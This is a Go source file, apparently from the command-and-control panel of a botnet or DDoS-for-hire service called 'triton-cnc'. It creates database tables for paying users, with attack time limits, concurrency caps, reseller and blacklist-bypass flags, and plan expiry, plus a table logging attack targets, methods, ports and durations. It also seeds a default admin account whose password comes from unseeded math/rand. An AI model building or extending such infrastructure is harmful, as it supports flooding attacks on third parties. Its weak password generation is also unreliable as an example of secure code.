package database

import (
	"log"
	"math/rand"
	"strconv"
	"strings"
	"time"
	"triton-cnc/core/models/util"
	"triton-cnc/core/models/versions"
)

const Users_table string = "CREATE TABLE `users` (" +
	"	`ID` int(10) unsigned NOT NULL AUTO_INCREMENT, " +
	"	`Username` varchar(64), " +
	"	`Password` varchar(128), " +
	"	`NewUser` tinyint(1), " +
	"	`Admin` tinyint(1), " +
	"	`Reseller` tinyint(1), " +
	"	`Banned` tinyint(1), " +
	"	`Vip` tinyint(1), " +
	"	`MaxTime` int(10) UNSIGNED DEFAULT NULL, " +
	"	`Cooldown` int(10) UNSIGNED DEFAULT NULL, " +
	"	`Concurrents` int(10) UNSIGNED DEFAULT NULL, " +
	"	`MaxSessions` int(10) UNSIGNED DEFAULT NULL, " +
	"	`PowerSavingExempt` tinyint(1), " +
	"	`BypassBlacklist` tinyint(1), " +
	"	`PlanExpiry` BigInt(20), " +
	"	PRIMARY KEY (`ID`), " +
	"	KEY `username` (`Username`)" +
	");"

var Create_user string = "INSERT INTO `users` (`ID`, `Username`, `Password`, `NewUser`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `BypassBlacklist`, `PlanExpiry`) VALUES" +
	"(NULL, '<<$username>>', '<<$password>>', 1, 1, 0, 0, 1, 1200, 30, 4, 5, 1, 1, <<$planexpiry>>);"

var Attack_table string = "CREATE TABLE `attacks` (" +
	"     `ID` int(10) unsigned NOT NULL AUTO_INCREMENT, " +
	"     `Username` varchar(20) NOT NULL, " +
	"     `Target` varchar(255) NOT NULL, " +
	"     `Method` varchar(20) NOT NULL, " +
	"     `Port` int(11) NOT NULL, " +
	"     `Duration` int(11) NOT NULL, " +
	"     `End` bigint(20) NOT NULL, " +
	"     `Created` bigint(20) NOT NULL, " +
	"     PRIMARY KEY (`ID`),  " +
	"     KEY `username` (`Username`)" +
	");"

func Create_Tables() (int, error) {

	Row, error := Database.Query(Attack_table)
	if error != nil {
		return 0, error
	}

	if Row.Err() != nil {
		return 0, Row.Err()
	}

	Row, error = Database.Query(Users_table)
	if error != nil {
		return 0, error
	}

	if Row.Err() != nil {
		return 0, Row.Err()
	}

	Create_user = strings.Replace(Create_user, "<<$username>>", versions.GOOS_Edition.Defaultuser, -1)
	Password := RandStringBytes(versions.GOOS_Edition.DefaultPassLen)
	Create_user = strings.Replace(Create_user, "<<$password>>", util.HashPassword(Password), -1)
	Create_user = strings.Replace(Create_user, "<<$planexpiry>>", strconv.Itoa(int(time.Now().Add(time.Hour*8760).Unix())), -1)

	Row, error = Database.Query(Create_user)
	if error != nil {
		return 1, error
	}

	if Row.Err() != nil {
		return 1, Row.Err()
	}

	log.Println("	- username: " + versions.GOOS_Edition.Defaultuser)
	log.Println("	- password: " + Password)
	log.Println("	- Expiry:", time.Now().Add(time.Hour*8760).Format("02 Jan 06"))

	return 2, nil
}

func RandStringBytes(n int) string {
	letterBytes := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}